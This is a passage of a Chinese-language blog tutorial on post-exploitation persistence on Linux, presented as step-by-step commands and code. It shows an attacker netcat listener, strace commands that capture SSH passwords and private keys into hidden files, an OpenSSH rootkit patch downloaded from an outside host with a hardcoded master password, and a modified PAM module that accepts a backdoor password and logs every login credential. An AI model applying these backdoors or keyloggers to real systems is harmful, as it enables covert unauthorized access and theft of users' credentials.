+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">vim</span><span class="w"> </span><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">crontab</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%8A%80%E6%9C%AF/image/26.png"
+	width="1509"
+	height="712"
+	srcset="/p/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%8A%80%E6%9C%AF/image/26_hu_c0d5c37f192698f1.png 480w, /p/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%8A%80%E6%9C%AF/image/26_hu_ca82a4180a8ee29b.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="211"
+		data-flex-basis="508px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">nc</span><span class="w"> </span><span class="o">-</span><span class="n">lvvp</span><span class="w"> </span><span class="n">3333</span><span class="w">          </span><span class="c1">//攻击机监听自己的3333端口</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%8A%80%E6%9C%AF/image/27.png"
+	width="1828"
+	height="711"
+	srcset="/p/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%8A%80%E6%9C%AF/image/27_hu_9e982c2ac9e3362c.png 480w, /p/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%8A%80%E6%9C%AF/image/27_hu_80535cbf52334b54.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="257"
+		data-flex-basis="617px"
+	
+></p>
+<h2 id="25strace后门">2.5.Strace后门（<strong><font style="color:rgb(13, 0, 22);">Linux-监控功能</font></strong>）
+</h2><p><strong>Strace 是一个动态跟踪工具，它可以跟踪系统调用的执行。我们可以把他当成一个键盘记录的后门，来扩大我们的信息收集范围</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">1</span><span class="err">、</span><span class="n">记录</span><span class="w"> </span><span class="n">sshd</span><span class="w"> </span><span class="nf">明文</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">(</span><span class="n">strace</span><span class="w"> </span><span class="o">-</span><span class="n">f</span><span class="w"> </span><span class="o">-</span><span class="n">F</span><span class="w"> </span><span class="o">-</span><span class="n">p</span><span class="w"> </span><span class="err">`</span><span class="n">ps</span><span class="w"> </span><span class="n">aux</span><span class="o">|</span><span class="n">grep</span><span class="w"> </span><span class="s">&#34;sshd -D&#34;</span><span class="o">|</span><span class="n">grep</span><span class="w"> </span><span class="o">-</span><span class="n">v</span><span class="w"> </span><span class="n">grep</span><span class="o">|</span><span class="n">awk</span><span class="w"> </span><span class="p">{</span><span class="err">&#39;</span><span class="n">print</span><span class="w"> </span><span class="n">$2</span><span class="err">&#39;</span><span class="p">}</span><span class="err">`</span><span class="w"> </span><span class="o">-</span><span class="n">t</span><span class="w"> </span><span class="o">-</span><span class="n">e</span><span class="w"> </span><span class="n">trace</span><span class="o">=</span><span class="n">read</span><span class="p">,</span><span class="n">write</span><span class="w"> </span><span class="o">-</span><span class="n">s</span><span class="w"> </span><span class="n">32</span><span class="w"> </span><span class="n">2</span><span class="o">&gt;</span><span class="w"> </span><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="p">.</span><span class="na">sshd</span><span class="p">.</span><span class="na">log</span><span class="w"> </span><span class="o">&amp;</span><span class="p">)</span><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">查看文件</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">grep</span><span class="w"> </span><span class="o">-</span><span class="n">E</span><span class="w"> </span><span class="err">&#39;</span><span class="n">read</span><span class="err">\</span><span class="p">(</span><span class="n">6</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;.+\\0\\0\\0\\.+&#34;</span><span class="err">&#39;</span><span class="w"> </span><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="p">.</span><span class="na">sshd</span><span class="p">.</span><span class="na">log</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">2</span><span class="err">、</span><span class="n">记录</span><span class="w"> </span><span class="n">sshd</span><span class="w"> </span><span class="nf">私钥</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">(</span><span class="n">strace</span><span class="w"> </span><span class="o">-</span><span class="n">f</span><span class="w"> </span><span class="o">-</span><span class="n">F</span><span class="w"> </span><span class="o">-</span><span class="n">p</span><span class="w"> </span><span class="err">`</span><span class="n">ps</span><span class="w"> </span><span class="n">aux</span><span class="o">|</span><span class="n">grep</span><span class="w"> </span><span class="s">&#34;sshd -D&#34;</span><span class="o">|</span><span class="n">grep</span><span class="w"> </span><span class="o">-</span><span class="n">v</span><span class="w"> </span><span class="n">grep</span><span class="o">|</span><span class="n">awk</span><span class="w"> </span><span class="p">{</span><span class="err">&#39;</span><span class="n">print</span><span class="w"> </span><span class="n">$2</span><span class="err">&#39;</span><span class="p">}</span><span class="err">`</span><span class="w"> </span><span class="o">-</span><span class="n">t</span><span class="w"> </span><span class="o">-</span><span class="n">e</span><span class="w"> </span><span class="n">trace</span><span class="o">=</span><span class="n">read</span><span class="p">,</span><span class="n">write</span><span class="w"> </span><span class="o">-</span><span class="n">s</span><span class="w"> </span><span class="n">4096</span><span class="w"> </span><span class="n">2</span><span class="o">&gt;</span><span class="w"> </span><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="p">.</span><span class="na">sshd</span><span class="p">.</span><span class="na">log</span><span class="w"> </span><span class="o">&amp;</span><span class="p">)</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>当你开启sshd键盘记录后，再次使用密码或私钥连接Linux服务器，自己的密码和私钥就会被记录在/tmp/.sshd.log文件夹下</strong></p>
+<p><img src="/p/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%8A%80%E6%9C%AF/image/28.png"
+	width="1559"
+	height="737"
+	srcset="/p/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%8A%80%E6%9C%AF/image/28_hu_8ac355480d98afaa.png 480w, /p/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%8A%80%E6%9C%AF/image/28_hu_8bfb1e0c11ef2ab9.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="211"
+		data-flex-basis="507px"
+	
+></p>
+<h2 id="26openssh后门">2.6.OpenSSH后门
+</h2><p><a class="link" href="https://www.cnblogs.com/croso/p/5280783.html"  target="_blank" rel="noopener"
+    >OpenSSH后门获取root密码及防范 - 极道先生 - 博客园</a></p>
+<p><strong>原理：替换本身操作系统的ssh协议支持软件openssh，重新安装自定义的openssh，达到记录账号密码，也可以采用万能密码连接的功能</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="o">[</span><span class="n">root</span><span class="nd">@iZj6c2zunt1ococ0t5jk1nZ</span><span class="w"> </span><span class="o">~]</span><span class="err">#</span><span class="w"> </span><span class="n">ssh</span><span class="w"> </span><span class="o">-</span><span class="n">V</span><span class="w">              </span><span class="c1">//查看当前ssh版本</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">OpenSSH_8</span><span class="p">.</span><span class="na">0p1</span><span class="p">,</span><span class="w"> </span><span class="n">OpenSSL</span><span class="w"> </span><span class="n">1</span><span class="p">.</span><span class="na">1</span><span class="p">.</span><span class="na">1k</span><span class="w">  </span><span class="n">FIPS</span><span class="w"> </span><span class="n">25</span><span class="w"> </span><span class="n">Mar</span><span class="w"> </span><span class="n">2021</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="err">#</span><span class="n">安装所需依赖</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">yum</span><span class="w"> </span><span class="o">-</span><span class="n">y</span><span class="w"> </span><span class="n">install</span><span class="w"> </span><span class="n">openssl</span><span class="w"> </span><span class="n">openssl</span><span class="o">-</span><span class="n">devel</span><span class="w"> </span><span class="n">pam</span><span class="o">-</span><span class="n">devel</span><span class="w"> </span><span class="n">zlib</span><span class="w"> </span><span class="n">zlib</span><span class="o">-</span><span class="n">devel</span><span class="w">    
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">yum</span><span class="w"> </span><span class="o">-</span><span class="n">y</span><span class="w"> </span><span class="n">install</span><span class="w"> </span><span class="n">gcc</span><span class="w"> </span><span class="n">gcc</span><span class="o">-</span><span class="n">c</span><span class="o">++</span><span class="w"> </span><span class="n">make</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">yum</span><span class="w"> </span><span class="o">-</span><span class="n">y</span><span class="w"> </span><span class="n">install</span><span class="w"> </span><span class="n">patch</span><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="err">#</span><span class="n">下载替换后门文件</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">wget</span><span class="w"> </span><span class="n">http</span><span class="p">:</span><span class="c1">//core.ipsecs.com/rootkit/patch-to-hack/0x06-openssh-5.9p1.patch.tar.gz</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">wget</span><span class="w"> </span><span class="n">https</span><span class="p">:</span><span class="c1">//mirror.aarnet.edu.au/pub/OpenBSD/OpenSSH/portable/openssh-5.9p1.tar.gz</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="err">#</span><span class="n">解压文件</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">tar</span><span class="w"> </span><span class="o">-</span><span class="n">xzvf</span><span class="w"> </span><span class="n">openssh</span><span class="o">-</span><span class="n">5</span><span class="p">.</span><span class="na">9p1</span><span class="p">.</span><span class="na">tar</span><span class="p">.</span><span class="na">gz</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">tar</span><span class="w"> </span><span class="o">-</span><span class="n">xzvf</span><span class="w"> </span><span class="n">0x06</span><span class="o">-</span><span class="n">openssh</span><span class="o">-</span><span class="n">5</span><span class="p">.</span><span class="na">9p1</span><span class="p">.</span><span class="na">patch</span><span class="p">.</span><span class="na">tar</span><span class="p">.</span><span class="na">gz</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="err">#</span><span class="n">安装openssh</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">cp</span><span class="w"> </span><span class="n">openssh</span><span class="o">-</span><span class="n">5</span><span class="p">.</span><span class="na">9p1</span><span class="p">.</span><span class="na">patch</span><span class="o">/</span><span class="n">sshbd5</span><span class="p">.</span><span class="na">9p1</span><span class="p">.</span><span class="na">diff</span><span class="w"> </span><span class="n">openssh</span><span class="o">-</span><span class="n">5</span><span class="p">.</span><span class="na">9p1</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">cd</span><span class="w"> </span><span class="n">openssh</span><span class="o">-</span><span class="n">5</span><span class="p">.</span><span class="na">9p1</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">patch</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">sshbd5</span><span class="p">.</span><span class="na">9p1</span><span class="p">.</span><span class="na">diff</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="err">#</span><span class="w"> </span><span class="n">进入openssh</span><span class="o">-</span><span class="n">5</span><span class="p">.</span><span class="na">9p1</span><span class="err">，</span><span class="n">把sshbd5</span><span class="p">.</span><span class="na">9p1</span><span class="p">.</span><span class="na">diff写入到patch中</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%8A%80%E6%9C%AF/image/29.png"
+	width="1971"
+	height="491"
+	srcset="/p/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%8A%80%E6%9C%AF/image/29_hu_f6b41b751acac40f.png 480w, /p/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%8A%80%E6%9C%AF/image/29_hu_ed27f4d0db5cad52.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="401"
+		data-flex-basis="963px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="err">#</span><span class="n">编辑版本文件</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">vim</span><span class="w"> </span><span class="n">version</span><span class="p">.</span><span class="na">h</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="err">#</span><span class="n">将ssh</span><span class="w"> </span><span class="o">-</span><span class="n">V显示的版本</span><span class="err">，</span><span class="n">替换到version</span><span class="p">.</span><span class="na">h文件中</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%8A%80%E6%9C%AF/image/30.png"
+	width="1669"
+	height="459"
+	srcset="/p/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%8A%80%E6%9C%AF/image/30_hu_2a81cd0d5d83df10.png 480w, /p/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%8A%80%E6%9C%AF/image/30_hu_57811998f8607f96.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="363"
+		data-flex-basis="872px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="err">#</span><span class="n">编辑密码</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">vim</span><span class="w"> </span><span class="n">include</span><span class="p">.</span><span class="na">h</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="err">#</span><span class="n">define</span><span class="w"> </span><span class="n">ILOG</span><span class="w"> </span><span class="s">&#34;/tmp/ilog&#34;</span><span class="w">         </span><span class="c1">//ilog是别人用ssh登录该主机的记录的日志文件</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="err">#</span><span class="n">define</span><span class="w"> </span><span class="n">OLOG</span><span class="w"> </span><span class="s">&#34;/tmp/olog&#34;</span><span class="w">         </span><span class="c1">//olog是该主机用ssh登录其它主机的日志记录</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="err">#</span><span class="n">define</span><span class="w"> </span><span class="n">SECRETPW</span><span class="w"> </span><span class="s">&#34;LsereinSec&#34;</span><span class="w">   </span><span class="c1">//万能密码</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="err">#</span><span class="n">endif</span><span class="w"> </span><span class="cm">/* INCLUDES_H */</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="err">#</span><span class="n">安装编译</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">.</span><span class="o">/</span><span class="n">configure</span><span class="w"> </span><span class="o">--</span><span class="n">prefix</span><span class="o">=/</span><span class="n">usr</span><span class="w"> </span><span class="o">--</span><span class="n">sysconfdir</span><span class="o">=/</span><span class="n">etc</span><span class="o">/</span><span class="n">ssh</span><span class="w"> </span><span class="o">--</span><span class="n">with</span><span class="o">-</span><span class="n">pam</span><span class="w"> </span><span class="o">--</span><span class="n">with</span><span class="o">-</span><span class="n">kerberos5</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">make</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">make</span><span class="w"> </span><span class="n">install</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">service</span><span class="w"> </span><span class="n">sshd</span><span class="w"> </span><span class="n">restart</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">systemctl</span><span class="w"> </span><span class="n">status</span><span class="w"> </span><span class="n">sshd</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">ssh</span><span class="w"> </span><span class="n">root</span><span class="nd">@IP</span><span class="w"> </span><span class="o">-</span><span class="n">p</span><span class="w"> </span><span class="n">LsereinSec进行连接即可</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="27ssh-pam后门">2.7.SSH PAM后门
+</h2><p><strong><font style="color:#000000;background-color:#FFFFFF;">PAM是Linux中的一种认证模块，</font><strong><strong><font style="color:#000000;">PAM相当于Windows的kerberos，</font></strong></strong><font style="color:#000000;background-color:#FFFFFF;">PAM可以作为Linux登录验证和各类基础服务的认证，简单来说就是一种用于Linux系统上的用户身份验证的机制。进行认证时首先确定是什么服务，然后加载相应的PAM的配置文件(位于/etc/pam.d)，最后调用认证文件(位于/lib/security)进行安全认证</font></strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">rpm</span><span class="w"> </span><span class="o">-</span><span class="n">qa</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">grep</span><span class="w"> </span><span class="n">pam</span><span class="w">         </span><span class="c1">//查询pam版本</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%8A%80%E6%9C%AF/image/31.png"
+	width="1109"
+	height="226"
+	srcset="/p/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%8A%80%E6%9C%AF/image/31_hu_1ed0665bea35bb.png 480w, /p/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%8A%80%E6%9C%AF/image/31_hu_55a62a3ab2e2e0d2.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="490"
+		data-flex-basis="1177px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">wget</span><span class="w"> </span><span class="n">https</span><span class="p">:</span><span class="c1">//github.com/linux-pam/linux-pam/releases/download/v1.3.1/Linux-PAM-1.3.1.tar.xz  //下载对应版本的pam文件</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="err">#</span><span class="n">安装所需依赖</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">yum</span><span class="w"> </span><span class="n">install</span><span class="w"> </span><span class="n">gcc</span><span class="w"> </span><span class="n">flex</span><span class="w"> </span><span class="n">flex</span><span class="o">-</span><span class="n">devel</span><span class="w"> </span><span class="o">-</span><span class="n">y</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="err">#</span><span class="n">修改pam_unix_auth</span><span class="p">.</span><span class="na">c文件</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">cd</span><span class="w"> </span><span class="n">Linux</span><span class="o">-</span><span class="n">PAM</span><span class="o">-</span><span class="n">1</span><span class="p">.</span><span class="na">3</span><span class="p">.</span><span class="na">1</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">cd</span><span class="w"> </span><span class="n">modules</span><span class="o">/</span><span class="n">pam_unix</span><span class="o">/</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">vim</span><span class="w"> </span><span class="n">pam_unix_auth</span><span class="p">.</span><span class="na">c</span><span class="w">           </span><span class="c1">//修改179行的文件内容为</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="cm">/* verify the password of this user */</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">retval</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">_unix_verify_password</span><span class="p">(</span><span class="n">pamh</span><span class="p">,</span><span class="w"> </span><span class="n">name</span><span class="p">,</span><span class="w"> </span><span class="n">p</span><span class="p">,</span><span class="w"> </span><span class="n">ctrl</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">if</span><span class="p">(</span><span class="n">strcmp</span><span class="p">(</span><span class="s">&#34;hackers&#34;</span><span class="p">,</span><span class="n">p</span><span class="p">)</span><span class="o">==</span><span class="n">0</span><span class="p">){</span><span class="k">return</span><span class="w"> </span><span class="n">PAM_SUCCESS</span><span class="p">;}</span><span class="w"> </span><span class="c1">//后门密码</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">if</span><span class="p">(</span><span class="n">retval</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">PAM_SUCCESS</span><span class="p">){</span><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">FILE</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="n">fp</span><span class="p">;</span><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">fp</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">fopen</span><span class="p">(</span><span class="s">&#34;/tmp/.sshlog&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;a&#34;</span><span class="p">);</span><span class="c1">//SSH登录用户密码保存位置</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">fprintf</span><span class="p">(</span><span class="n">fp</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;%s : %s\n&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">name</span><span class="p">,</span><span class="w"> </span><span class="n">p</span><span class="p">);</span><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">fclose</span><span class="p">(</span><span class="n">fp</span><span class="p">);}</span><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">p</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">NULL</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">AUTH_RETURN</span><span class="p">;</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%8A%80%E6%9C%AF/image/32.png"
+	width="1584"
+	height="548"
+	srcset="/p/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%8A%80%E6%9C%AF/image/32_hu_ec5968bab9c6484f.png 480w, /p/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%8A%80%E6%9C%AF/image/32_hu_a163ae4694914528.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="289"
+		data-flex-basis="693px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">cd</span><span class="w"> </span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="w">           
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">.</span><span class="o">/</span><span class="n">configure</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">make</span><span class="w">          </span><span class="n">编译安装</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="err">#</span><span class="n">把原来的pam_unix</span><span class="p">.</span><span class="na">so文件备份</span><span class="err">，</span><span class="n">并把新的pam_unix</span><span class="p">.</span><span class="na">so</span><span class="err">，</span><span class="n">复制到原来的位置</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">cp</span><span class="w"> </span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">lib64</span><span class="o">/</span><span class="n">security</span><span class="o">/</span><span class="n">pam_unix</span><span class="p">.</span><span class="na">so</span><span class="w"> </span><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">pam_unix</span><span class="p">.</span><span class="na">so</span><span class="p">.</span><span class="na">bakcp</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">cd</span><span class="w"> </span><span class="n">modules</span><span class="o">/</span><span class="n">pam_unix</span><span class="o">/</span><span class="p">.</span><span class="na">libs</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">cp</span><span class="w"> </span><span class="n">pam_unix</span><span class="p">.</span><span class="na">so</span><span class="w"> </span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">lib64</span><span class="o">/</span><span class="n">security</span><span class="o">/</span><span class="n">pam_unix</span><span class="p">.</span><span class="na">so</span><span class="w">
